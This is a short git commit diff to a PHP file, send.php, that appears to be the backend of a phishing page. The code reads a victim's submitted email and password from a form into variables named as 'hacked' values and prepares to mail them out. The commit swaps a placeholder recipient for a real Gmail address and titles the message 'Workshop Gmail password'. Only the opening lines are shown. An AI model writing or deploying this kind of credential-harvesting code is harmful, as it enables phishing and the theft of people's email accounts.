14be71e2977e6f03b9b2bdda0af0047f4674648c
AfdhalCodes <128670738+H4CK1T@users.noreply.github.com>
2025-01-26 15:09:24 +0700

    lmao

--- send.php
+++ send.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "yourmailaddresshere@gmail.com";
+         $to = "kingcoding201@gmail.com";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
